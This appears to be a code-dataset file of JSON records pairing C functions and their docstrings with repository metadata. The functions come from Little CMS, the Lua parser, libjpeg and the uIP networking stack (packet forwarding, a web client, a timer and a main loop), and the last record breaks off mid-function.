{"docstring": "// Auxiliar to retrieve a pointer to the segmentr containing the Lab value\n", "func_signal": "static\ncmsGDBPoint* GetPoint(cmsGDB* gbd, const cmsCIELab* Lab, cmsSpherical* sp)", "code": "{\n    cmsVEC3 v;  \n    int alpha, theta;\n\n    // Housekeeping\n    _cmsAssert(gbd != NULL);\n\t_cmsAssert(Lab != NULL);\n\t_cmsAssert(sp != NULL);\n\n    // Center L* by substracting half of its domain, that's 50 \n    _cmsVEC3init(&v, Lab ->L - 50.0, Lab ->a, Lab ->b);\n\t\n    // Convert to spherical coordinates\n    ToSpherical(sp, &v);\n    \n    if (sp ->r < 0 || sp ->alpha < 0 || sp->theta < 0) {\n         cmsSignalError(gbd ->ContextID, cmsERROR_RANGE, \"spherical value out of range\");\n         return NULL;\n    }\n\n    // On which sector it falls?\n    QuantizeToSector(sp, &alpha, &theta);\n  \t\n    if (alpha < 0 || theta < 0 || alpha >= SECTORS || theta >= SECTORS) {\n         cmsSignalError(gbd ->ContextID, cmsERROR_RANGE, \" quadrant out of range\");\n         return NULL;\n    }\n\n    // Get pointer to the sector\n    return &gbd ->Gamut[theta][alpha];\n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "// Convert to spherical coordinates\n", "func_signal": "static\nvoid ToSpherical(cmsSpherical* sp, const cmsVEC3* v)", "code": "{\n\n    cmsFloat64Number L, a, b;\n    \n    L = v ->n[VX];\n    a = v ->n[VY];\n    b = v ->n[VZ];\n    \n    sp ->r = sqrt( L*L + a*a + b*b );\n\n   if (sp ->r == 0) {\n        sp ->alpha = sp ->theta = 0;\n        return;\n    }\n\t    \n    sp ->alpha = _cmsAtan2(a, b);   \n    sp ->theta = _cmsAtan2(sqrt(a*a + b*b), L);  \n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/*============================================================*/\n/* GRAMMAR RULES */\n/*============================================================*/\n", "func_signal": "static void field (LexState *ls, expdesc *v)", "code": "{\n  /* field -> ['.' | ':'] NAME */\n  FuncState *fs = ls->fs;\n  expdesc key;\n  luaK_exp2anyreg(fs, v);\n  luaX_next(ls);  /* skip the dot or colon */\n  checkname(ls, &key);\n  luaK_indexed(fs, v, &key);\n}", "path": "jni\\lua-5.1.4\\src\\lparser.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "// Interpolate missing parts. The algorithm fist computes slices at\n// theta=0 and theta=Max.\n", "func_signal": "cmsBool CMSEXPORT cmsGDBCompute(cmsHANDLE hGBD, cmsUInt32Number dwFlags)", "code": "{\n    int alpha, theta;\n    cmsGDB* gbd = (cmsGDB*) hGBD;\n\n    _cmsAssert(hGBD != NULL);\n\n    // Interpolate black\n    for (alpha = 0; alpha <= SECTORS; alpha++) {\n\n        if (!InterpolateMissingSector(gbd, alpha, 0)) return FALSE;\n    }\n\n    // Interpolate white\n    for (alpha = 0; alpha <= SECTORS; alpha++) {\n\n        if (!InterpolateMissingSector(gbd, alpha, SECTORS-1)) return FALSE;\n    }\n\n\n    // Interpolate Mid\n    for (theta = 1; theta < SECTORS; theta++) {\n        for (alpha = 0; alpha <= SECTORS; alpha++) {\n\n            if (!InterpolateMissingSector(gbd, alpha, theta)) return FALSE;\n        }\n    }\n\n    // Done\n    return TRUE;\n\n    cmsUNUSED_PARAMETER(dwFlags);\n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/* }====================================================================== */\n", "func_signal": "static void parlist (LexState *ls)", "code": "{\n  /* parlist -> [ param { `,' param } ] */\n  FuncState *fs = ls->fs;\n  Proto *f = fs->f;\n  int nparams = 0;\n  f->is_vararg = 0;\n  if (ls->t.token != ')') {  /* is `parlist' not empty? */\n    do {\n      switch (ls->t.token) {\n        case TK_NAME: {  /* param -> NAME */\n          new_localvar(ls, str_checkname(ls), nparams++);\n          break;\n        }\n        case TK_DOTS: {  /* param -> `...' */\n          luaX_next(ls);\n#if defined(LUA_COMPAT_VARARG)\n          /* use `arg' as default name */\n          new_localvarliteral(ls, \"arg\", nparams++);\n          f->is_vararg = VARARG_HASARG | VARARG_NEEDSARG;\n#endif\n          f->is_vararg |= VARARG_ISVARARG;\n          break;\n        }\n        default: luaX_syntaxerror(ls, \"<name> or \" LUA_QL(\"...\") \" expected\");\n      }\n    } while (!f->is_vararg && testnext(ls, ','));\n  }\n  adjustlocalvars(ls, nparams);\n  f->numparams = cast_byte(fs->nactvar - (f->is_vararg & VARARG_HASARG));\n  luaK_reserveregs(fs, fs->nactvar);  /* reserve register for parameters */\n}", "path": "jni\\lua-5.1.4\\src\\lparser.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/*\n** check whether, in an assignment to a local variable, the local variable\n** is needed in a previous assignment (to a table). If so, save original\n** local value in a safe place and use this safe copy in the previous\n** assignment.\n*/\n", "func_signal": "static void check_conflict (LexState *ls, struct LHS_assign *lh, expdesc *v)", "code": "{\n  FuncState *fs = ls->fs;\n  int extra = fs->freereg;  /* eventual position to save local variable */\n  int conflict = 0;\n  for (; lh; lh = lh->prev) {\n    if (lh->v.k == VINDEXED) {\n      if (lh->v.u.s.info == v->u.s.info) {  /* conflict? */\n        conflict = 1;\n        lh->v.u.s.info = extra;  /* previous assignment will use safe copy */\n      }\n      if (lh->v.u.s.aux == v->u.s.info) {  /* conflict? */\n        conflict = 1;\n        lh->v.u.s.aux = extra;  /* previous assignment will use safe copy */\n      }\n    }\n  }\n  if (conflict) {\n    luaK_codeABC(fs, OP_MOVE, fs->freereg, v->u.s.info, 0);  /* make copy */\n    luaK_reserveregs(fs, 1);\n  }\n}", "path": "jni\\lua-5.1.4\\src\\lparser.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/*\n * Write an abbreviated table-specification datastream.\n * This consists of SOI, DQT and DHT tables, and EOI.\n * Any table that is defined and not marked sent_table = TRUE will be\n * emitted.  Note that all tables will be marked sent_table = TRUE at exit.\n */\n", "func_signal": "METHODDEF(void)\nwrite_tables_only (j_compress_ptr cinfo)", "code": "{\n  int i;\n\n  emit_marker(cinfo, M_SOI);\n\n  for (i = 0; i < NUM_QUANT_TBLS; i++) {\n    if (cinfo->quant_tbl_ptrs[i] != NULL)\n      (void) emit_dqt(cinfo, i);\n  }\n\n  if (! cinfo->arith_code) {\n    for (i = 0; i < NUM_HUFF_TBLS; i++) {\n      if (cinfo->dc_huff_tbl_ptrs[i] != NULL)\n\temit_dht(cinfo, i, FALSE);\n      if (cinfo->ac_huff_tbl_ptrs[i] != NULL)\n\temit_dht(cinfo, i, TRUE);\n    }\n  }\n\n  emit_marker(cinfo, M_EOI);\n}", "path": "jni\\jpeg-8c\\jcmarker.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "// ATAN2() which always returns degree positive numbers\n", "func_signal": "static\ncmsFloat64Number _cmsAtan2(cmsFloat64Number y, cmsFloat64Number x)", "code": "{\n    cmsFloat64Number a;\n    \n    // Deal with undefined case\n    if (x == 0.0 && y == 0.0) return 0;\n\n    a = (atan2(y, x) * 180.0) / M_PI;\n\n    while (a < 0) {\n        a += 360;\n    }\n\n    return a;\n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "// Add a point to gamut descriptor. Point to add is in Lab color space. \n// GBD is centered on a=b=0 and L*=50\n", "func_signal": "cmsBool CMSEXPORT cmsGDBAddPoint(cmsHANDLE hGBD, const cmsCIELab* Lab)", "code": "{\n    cmsGDB* gbd = (cmsGDB*) hGBD;\n    cmsGDBPoint* ptr;\n    cmsSpherical sp;\n\n\n    // Get pointer to the sector\n    ptr = GetPoint(gbd, Lab, &sp);\n    if (ptr == NULL) return FALSE;\n\n    // If no samples at this sector, add it\n    if (ptr ->Type == GP_EMPTY) {\n\n        ptr -> Type = GP_SPECIFIED;\n        ptr -> p    = sp;\n    }\n    else {\n\n\n        // Substitute only if radius is greater\n        if (sp.r > ptr -> p.r) {\n\n                ptr -> Type = GP_SPECIFIED;\n                ptr -> p    = sp;\n        }\n    }\n\n    return TRUE;\n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/*\n * Write frame header.\n * This consists of DQT and SOFn markers, and a conditional pseudo SOS marker.\n * Note that we do not emit the SOF until we have emitted the DQT(s).\n * This avoids compatibility problems with incorrect implementations that\n * try to error-check the quant table numbers as soon as they see the SOF.\n */\n", "func_signal": "METHODDEF(void)\nwrite_frame_header (j_compress_ptr cinfo)", "code": "{\n  int ci, prec;\n  boolean is_baseline;\n  jpeg_component_info *compptr;\n  \n  /* Emit DQT for each quantization table.\n   * Note that emit_dqt() suppresses any duplicate tables.\n   */\n  prec = 0;\n  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n       ci++, compptr++) {\n    prec += emit_dqt(cinfo, compptr->quant_tbl_no);\n  }\n  /* now prec is nonzero iff there are any 16-bit quant tables. */\n\n  /* Check for a non-baseline specification.\n   * Note we assume that Huffman table numbers won't be changed later.\n   */\n  if (cinfo->arith_code || cinfo->progressive_mode ||\n      cinfo->data_precision != 8 || cinfo->block_size != DCTSIZE) {\n    is_baseline = FALSE;\n  } else {\n    is_baseline = TRUE;\n    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n\t ci++, compptr++) {\n      if (compptr->dc_tbl_no > 1 || compptr->ac_tbl_no > 1)\n\tis_baseline = FALSE;\n    }\n    if (prec && is_baseline) {\n      is_baseline = FALSE;\n      /* If it's baseline except for quantizer size, warn the user */\n      TRACEMS(cinfo, 0, JTRC_16BIT_TABLES);\n    }\n  }\n\n  /* Emit the proper SOF marker */\n  if (cinfo->arith_code) {\n    if (cinfo->progressive_mode)\n      emit_sof(cinfo, M_SOF10); /* SOF code for progressive arithmetic */\n    else\n      emit_sof(cinfo, M_SOF9);  /* SOF code for sequential arithmetic */\n  } else {\n    if (cinfo->progressive_mode)\n      emit_sof(cinfo, M_SOF2);\t/* SOF code for progressive Huffman */\n    else if (is_baseline)\n      emit_sof(cinfo, M_SOF0);\t/* SOF code for baseline implementation */\n    else\n      emit_sof(cinfo, M_SOF1);\t/* SOF code for non-baseline Huffman file */\n  }\n\n  /* Check to emit pseudo SOS marker */\n  if (cinfo->progressive_mode && cinfo->block_size != DCTSIZE)\n    emit_pseudo_sos(cinfo);\n}", "path": "jni\\jpeg-8c\\jcmarker.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "// Evaluate parametric line \n", "func_signal": "static\nvoid GetPointOfLine(cmsVEC3* p, const cmsLine* line, cmsFloat64Number t)", "code": "{\n    p ->n[VX] = line ->a.n[VX] + t * line->u.n[VX];\n    p ->n[VY] = line ->a.n[VY] + t * line->u.n[VY];\n    p ->n[VZ] = line ->a.n[VZ] + t * line->u.n[VZ];     \n}", "path": "jni\\lcms2-2.2\\src\\cmssm.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/*\n * Initialize the marker writer module.\n */\n", "func_signal": "GLOBAL(void)\njinit_marker_writer (j_compress_ptr cinfo)", "code": "{\n  my_marker_ptr marker;\n\n  /* Create the subobject */\n  marker = (my_marker_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tSIZEOF(my_marker_writer));\n  cinfo->marker = (struct jpeg_marker_writer *) marker;\n  /* Initialize method pointers */\n  marker->pub.write_file_header = write_file_header;\n  marker->pub.write_frame_header = write_frame_header;\n  marker->pub.write_scan_header = write_scan_header;\n  marker->pub.write_file_trailer = write_file_trailer;\n  marker->pub.write_tables_only = write_tables_only;\n  marker->pub.write_marker_header = write_marker_header;\n  marker->pub.write_marker_byte = write_marker_byte;\n  /* Initialize private state */\n  marker->last_restart_interval = 0;\n}", "path": "jni\\jpeg-8c\\jcmarker.c", "repo_name": "hagish/love-native-android", "stars": 62, "license": "None", "language": "c", "size": 18944}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * \\internal\n * Find a network interface for the IP packet in uip_buf.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "static struct uip_fw_netif *\nfind_netif(void)", "code": "{\n  struct uip_fw_netif *netif;\n  \n  /* Walk through every network interface to check for a match. */\n  for(netif = netifs; netif != NULL; netif = netif->next) {\n    if(ipaddr_maskcmp(BUF->destipaddr, netif->ipaddr,\n\t\t      netif->netmask)) {\n      /* If there was a match, we break the loop. */\n      return netif;\n    }\n  }\n  \n  /* If no matching netif was found, we use default netif. */\n  return defaultnetif;\n}", "path": "uip\\uip-fw.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static void\ninit_connection(void)", "code": "{\n  s.state = WEBCLIENT_STATE_STATUSLINE;\n\n  s.getrequestleft = sizeof(http_get) - 1 + 1 +\n    sizeof(http_10) - 1 +\n    sizeof(http_crnl) - 1 +\n    sizeof(http_host) - 1 +\n    sizeof(http_crnl) - 1 +\n    strlen(http_user_agent_fields) +\n    strlen(s.file) + strlen(s.host);\n  s.getrequestptr = 0;\n\n  s.httpheaderlineptr = 0;\n}", "path": "uip\\apps\\webclient\\webclient.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static char\ncasecmp(char *str1, const char *str2, char len)", "code": "{\n  static char c;\n  \n  while(len > 0) {\n    c = *str1;\n    /* Force lower-case characters. */\n    if(c & 0x40) {\n      c |= 0x20;\n    }\n    if(*str2 != c) {\n      return 1;\n    }\n    ++str1;\n    ++str2;\n    --len;\n  }\n  return 0;\n}", "path": "uip\\apps\\webclient\\webclient.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * Perform periodic processing.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_fw_periodic(void)", "code": "{\n  struct fwcache_entry *fw;\n  for(fw = fwcache; fw < &fwcache[FWCACHE_SIZE]; ++fw) {\n    if(fw->timer > 0) {\n      --fw->timer;\n    }\n  }\n}", "path": "uip\\uip-fw.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static void\nnewdata(void)", "code": "{\n  u16_t len;\n\n  len = uip_datalen();\n\n  if(s.state == WEBCLIENT_STATE_STATUSLINE) {\n    len = parse_statusline(len);\n  }\n  \n  if(s.state == WEBCLIENT_STATE_HEADERS && len > 0) {\n    len = parse_headers(len);\n  }\n\n  if(len > 0 && s.state == WEBCLIENT_STATE_DATA &&\n     s.httpflag != HTTPFLAG_MOVED) {\n    webclient_datahandler((char *)uip_appdata, len);\n  }\n}", "path": "uip\\apps\\webclient\\webclient.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * \\internal\n * Check if an IP address is within the network defined by an IP\n * address and a netmask.\n *\n * \\param ipaddr The IP address to be checked.\n * \\param netipaddr The IP address of the network.\n * \\param netmask The netmask of the network.\n *\n * \\return Non-zero if IP address is in network, zero otherwise.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "static unsigned char\nipaddr_maskcmp(u16_t *ipaddr, u16_t *netipaddr, u16_t *netmask)", "code": "{\n  return (ipaddr[0] & netmask [0]) == (netipaddr[0] & netmask[0]) &&\n    (ipaddr[1] & netmask[1]) == (netipaddr[1] & netmask[1]);\n}", "path": "uip\\uip-fw.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * Output an IP packet on the correct network interface.\n *\n * The IP packet should be present in the uip_buf buffer and its\n * length in the global uip_len variable.\n *\n * \\retval UIP_FW_ZEROLEN Indicates that a zero-length packet\n * transmission was attempted and that no packet was sent.\n *\n * \\retval UIP_FW_NOROUTE No suitable network interface could be found\n * for the outbound packet, and the packet was not sent.\n *\n * \\return The return value from the actual network interface output\n * function is passed unmodified as a return value.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "u8_t\nuip_fw_output(void)", "code": "{\n  struct uip_fw_netif *netif;\n\n  if(uip_len == 0) {\n    return UIP_FW_ZEROLEN;\n  }\n\n  fwcache_register();\n\n#if UIP_BROADCAST\n  /* Link local broadcasts go out on all interfaces. */\n  if(/*BUF->proto == UIP_PROTO_UDP &&*/\n     BUF->destipaddr[0] == 0xffff &&\n     BUF->destipaddr[1] == 0xffff) {\n    if(defaultnetif != NULL) {\n      defaultnetif->output();\n    }\n    for(netif = netifs; netif != NULL; netif = netif->next) {\n      netif->output();\n    }\n    return UIP_FW_OK;\n  }\n#endif /* UIP_BROADCAST */\n  \n  netif = find_netif();\n  /*  printf(\"uip_fw_output: netif %p ->output %p len %d\\n\", netif,\n\t netif->output,\n\t uip_len);*/\n\n  if(netif == NULL) {\n    return UIP_FW_NOROUTE;\n  }\n  /* If we now have found a suitable network interface, we call its\n     output function to send out the packet. */\n  return netif->output();\n}", "path": "uip\\uip-fw.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * Forward an IP packet in the uip_buf buffer.\n *\n *\n *\n * \\return UIP_FW_FORWARDED if the packet was forwarded, UIP_FW_LOCAL if\n * the packet should be processed locally.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "u8_t\nuip_fw_forward(void)", "code": "{\n  struct fwcache_entry *fw;\n\n  /* First check if the packet is destined for ourselves and return 0\n     to indicate that the packet should be processed locally. */\n  if(BUF->destipaddr[0] == uip_hostaddr[0] &&\n     BUF->destipaddr[1] == uip_hostaddr[1]) {\n    return UIP_FW_LOCAL;\n  }\n\n  /* If we use ping IP address configuration, and our IP address is\n     not yet configured, we should intercept all ICMP echo packets. */\n#if UIP_PINGADDRCONF\n  if((uip_hostaddr[0] | uip_hostaddr[1]) == 0 &&\n     BUF->proto == UIP_PROTO_ICMP &&\n     ICMPBUF->type == ICMP_ECHO) {\n    return UIP_FW_LOCAL;\n  }\n#endif /* UIP_PINGADDRCONF */\n\n  /* Check if the packet is in the forwarding cache already, and if so\n     we drop it. */\n\n  for(fw = fwcache; fw < &fwcache[FWCACHE_SIZE]; ++fw) {\n    if(fw->timer != 0 &&\n#if UIP_REASSEMBLY > 0\n       fw->len == BUF->len &&\n       fw->offset == BUF->ipoffset &&\n#endif\n       fw->ipid == BUF->ipid &&\n       fw->srcipaddr[0] == BUF->srcipaddr[0] &&\n       fw->srcipaddr[1] == BUF->srcipaddr[1] &&\n       fw->destipaddr[0] == BUF->destipaddr[0] &&\n       fw->destipaddr[1] == BUF->destipaddr[1] &&\n#if notdef\n       fw->payload[0] == BUF->srcport &&\n       fw->payload[1] == BUF->destport &&\n#endif\n       fw->proto == BUF->proto) {\n      /* Drop packet. */\n      return UIP_FW_FORWARDED;\n    }\n  }\n\n  /* If the TTL reaches zero we produce an ICMP time exceeded message\n     in the uip_buf buffer and forward that packet back to the sender\n     of the packet. */\n  if(BUF->ttl <= 1) {\n    /* No time exceeded for broadcasts and multicasts! */\n    if(BUF->destipaddr[0] == 0xffff && BUF->destipaddr[1] == 0xffff) {\n      return UIP_FW_LOCAL;\n    }\n    time_exceeded();\n  }\n  \n  /* Decrement the TTL (time-to-live) value in the IP header */\n  BUF->ttl = BUF->ttl - 1;\n  \n  /* Update the IP checksum. */\n  if(BUF->ipchksum >= HTONS(0xffff - 0x0100)) {\n    BUF->ipchksum = BUF->ipchksum + HTONS(0x0100) + 1;\n  } else {\n    BUF->ipchksum = BUF->ipchksum + HTONS(0x0100);\n  }\n\n  if(uip_len > 0) {\n    uip_appdata = &uip_buf[UIP_LLH_LEN + UIP_TCPIP_HLEN];\n    uip_fw_output();\n  }\n\n#if UIP_BROADCAST\n  if(BUF->destipaddr[0] == 0xffff && BUF->destipaddr[1] == 0xffff) {\n    return UIP_FW_LOCAL;\n  }\n#endif /* UIP_BROADCAST */\n\n  /* Return non-zero to indicate that the packet was forwarded and that no\n     other processing should be made. */\n  return UIP_FW_FORWARDED;\n}", "path": "uip\\uip-fw.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "clock_time_t\nclock_time(void)", "code": "{\n  struct timeval tv;\n  struct timezone tz;\n\n  gettimeofday(&tv, &tz);\n\n  return tv.tv_sec * 1000 + tv.tv_usec / 1000;\n}", "path": "uip\\unix\\clock-arch.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "int\nmain(void)", "code": "{\n  int i;\n  uip_ipaddr_t ipaddr;\n  struct timer periodic_timer, arp_timer;\n\n  timer_set(&periodic_timer, CLOCK_SECOND / 2);\n  timer_set(&arp_timer, CLOCK_SECOND * 10);\n  \n  tapdev_init();\n  uip_init();\n\n  uip_ipaddr(ipaddr, 192,168,0,2);\n  uip_sethostaddr(ipaddr);\n  uip_ipaddr(ipaddr, 192,168,0,1);\n  uip_setdraddr(ipaddr);\n  uip_ipaddr(ipaddr, 255,255,255,0);\n  uip_setnetmask(ipaddr);\n\n  httpd_init();\n  \n  /*  telnetd_init();*/\n  \n  /*  hello_world_init();*/\n\n  /*  {\n      u8_t mac[6] = {1,2,3,4,5,6};\n      dhcpc_init(&mac, 6);\n      }*/\n  \n  /*uip_ipaddr(ipaddr, 127,0,0,1);\n  smtp_configure(\"localhost\", ipaddr);\n  SMTP_SEND(\"adam@sics.se\", NULL, \"uip-testing@example.com\",\n\t    \"Testing SMTP from uIP\",\n\t    \"Test message sent by uIP\\r\\n\");*/\n\n  /*\n    webclient_init();\n    resolv_init();\n    uip_ipaddr(ipaddr, 195,54,122,204);\n    resolv_conf(ipaddr);\n    resolv_query(\"www.sics.se\");*/\n\n\n  \n  while(1) {\n    uip_len = tapdev_read();\n    if(uip_len > 0) {\n      if(BUF->type == htons(UIP_ETHTYPE_IP)) {\n\tuip_arp_ipin();\n\tuip_input();\n\t/* If the above function invocation resulted in data that\n\t   should be sent out on the network, the global variable\n\t   uip_len is set to a value > 0. */\n\tif(uip_len > 0) {\n\t  uip_arp_out();\n\t  tapdev_send();\n\t}\n      } else if(BUF->type == htons(UIP_ETHTYPE_ARP)) {\n\tuip_arp_arpin();\n\t/* If the above function invocation resulted in data that\n\t   should be sent out on the network, the global variable\n\t   uip_len is set to a value > 0. */\n\tif(uip_len > 0) {\n\t  tapdev_send();\n\t}\n      }\n\n    } else if(timer_expired(&periodic_timer)) {\n      timer_reset(&periodic_timer);\n      for(i = 0; i < UIP_CONNS; i++) {\n\tuip_periodic(i);\n\t/* If the above function invocation resulted in data that\n\t   should be sent out on the network, the global variable\n\t   uip_len is set to a value > 0. */\n\tif(uip_len > 0) {\n\t  uip_arp_out();\n\t  tapdev_send();\n\t}\n      }\n\n#if UIP_UDP\n      for(i = 0; i < UIP_UDP_CONNS; i++) {\n\tuip_udp_periodic(i);\n\t/* If the above function invocation resulted in data that\n\t   should be sent out on the network, the global variable\n\t   uip_len is set to a value > 0. */\n\tif(uip_len > 0) {\n\t  uip_arp_out();\n\t  tapdev_send();\n\t}\n      }\n#endif /* UIP_UDP */\n      \n      /* Call the ARP timer function every 10 seconds. */\n      if(timer_expired(&arp_timer)) {\n\ttimer_reset(&arp_timer);\n\tuip_arp_timer();\n      }\n    }\n  }\n  return 0;\n}", "path": "uip\\unix\\main.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static u8_t\nhttpd_fs_strcmp(const char *str1, const char *str2)", "code": "{\n  u8_t i;\n  i = 0;\n loop:\n\n  if(str2[i] == 0 ||\n     str1[i] == '\\r' ||\n     str1[i] == '\\n') {\n    return 0;\n  }\n\n  if(str1[i] != str2[i]) {\n    return 1;\n  }\n\n\n  ++i;\n  goto loop;\n}", "path": "uip\\apps\\webserver\\httpd-fs.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static void\nsenddata(void)", "code": "{\n  u16_t len;\n  char *getrequest;\n  char *cptr;\n  \n  if(s.getrequestleft > 0) {\n    cptr = getrequest = (char *)uip_appdata;\n\n    cptr = copy_string(cptr, http_get, sizeof(http_get) - 1);\n    cptr = copy_string(cptr, s.file, strlen(s.file));\n    *cptr++ = ISO_space;\n    cptr = copy_string(cptr, http_10, sizeof(http_10) - 1);\n\n    cptr = copy_string(cptr, http_crnl, sizeof(http_crnl) - 1);\n    \n    cptr = copy_string(cptr, http_host, sizeof(http_host) - 1);\n    cptr = copy_string(cptr, s.host, strlen(s.host));\n    cptr = copy_string(cptr, http_crnl, sizeof(http_crnl) - 1);\n\n    cptr = copy_string(cptr, http_user_agent_fields,\n\t\t       strlen(http_user_agent_fields));\n    \n    len = s.getrequestleft > uip_mss()?\n      uip_mss():\n      s.getrequestleft;\n    uip_send(&(getrequest[s.getrequestptr]), len);\n  }\n}", "path": "uip\\apps\\webclient\\webclient.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static unsigned char *\ncopy_string(unsigned char *dest,\n\t    const unsigned char *src, unsigned char len)", "code": "{\n  strncpy(dest, src, len);\n  return dest + len;\n}", "path": "uip\\apps\\webclient\\webclient.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * \\internal\n * Register a packet in the forwarding cache so that it won't be\n * forwarded again.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "static void\nfwcache_register(void)", "code": "{\n  struct fwcache_entry *fw;\n  int i, oldest;\n\n  oldest = FW_TIME;\n  fw = NULL;\n  \n  /* Find the oldest entry in the cache. */\n  for(i = 0; i < FWCACHE_SIZE; ++i) {\n    if(fwcache[i].timer == 0) {\n      fw = &fwcache[i];\n      break;\n    } else if(fwcache[i].timer <= oldest) {\n      fw = &fwcache[i];\n      oldest = fwcache[i].timer;\n    }\n  }\n\n  fw->timer = FW_TIME;\n  fw->ipid = BUF->ipid;\n  fw->srcipaddr[0] = BUF->srcipaddr[0];\n  fw->srcipaddr[1] = BUF->srcipaddr[1];\n  fw->destipaddr[0] = BUF->destipaddr[0];\n  fw->destipaddr[1] = BUF->destipaddr[1];\n  fw->proto = BUF->proto;\n#if notdef\n  fw->payload[0] = BUF->srcport;\n  fw->payload[1] = BUF->destport;\n#endif\n#if UIP_REASSEMBLY > 0\n  fw->len = BUF->len;\n  fw->offset = BUF->ipoffset;\n#endif\n}", "path": "uip\\uip-fw.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_split_output(void)", "code": "{\n  u16_t tcplen, len1, len2;\n\n  /* We only try to split maximum sized TCP segments. */\n  if(BUF->proto == UIP_PROTO_TCP &&\n     uip_len == UIP_BUFSIZE - UIP_LLH_LEN) {\n\n    tcplen = uip_len - UIP_TCPIP_HLEN;\n    /* Split the segment in two. If the original packet length was\n       odd, we make the second packet one byte larger. */\n    len1 = len2 = tcplen / 2;\n    if(len1 + len2 < tcplen) {\n      ++len2;\n    }\n\n    /* Create the first packet. This is done by altering the length\n       field of the IP header and updating the checksums. */\n    uip_len = len1 + UIP_TCPIP_HLEN;\n#if UIP_CONF_IPV6\n    /* For IPv6, the IP length field does not include the IPv6 IP header\n       length. */\n    BUF->len[0] = ((uip_len - UIP_IPH_LEN) >> 8);\n    BUF->len[1] = ((uip_len - UIP_IPH_LEN) & 0xff);\n#else /* UIP_CONF_IPV6 */\n    BUF->len[0] = uip_len >> 8;\n    BUF->len[1] = uip_len & 0xff;\n#endif /* UIP_CONF_IPV6 */\n    \n    /* Recalculate the TCP checksum. */\n    BUF->tcpchksum = 0;\n    BUF->tcpchksum = ~(uip_tcpchksum());\n\n#if !UIP_CONF_IPV6\n    /* Recalculate the IP checksum. */\n    BUF->ipchksum = 0;\n    BUF->ipchksum = ~(uip_ipchksum());\n#endif /* UIP_CONF_IPV6 */\n    \n    /* Transmit the first packet. */\n    /*    uip_fw_output();*/\n    tcpip_output();\n\n    /* Now, create the second packet. To do this, it is not enough to\n       just alter the length field, but we must also update the TCP\n       sequence number and point the uip_appdata to a new place in\n       memory. This place is detemined by the length of the first\n       packet (len1). */\n    uip_len = len2 + UIP_TCPIP_HLEN;\n#if UIP_CONF_IPV6\n    /* For IPv6, the IP length field does not include the IPv6 IP header\n       length. */\n    BUF->len[0] = ((uip_len - UIP_IPH_LEN) >> 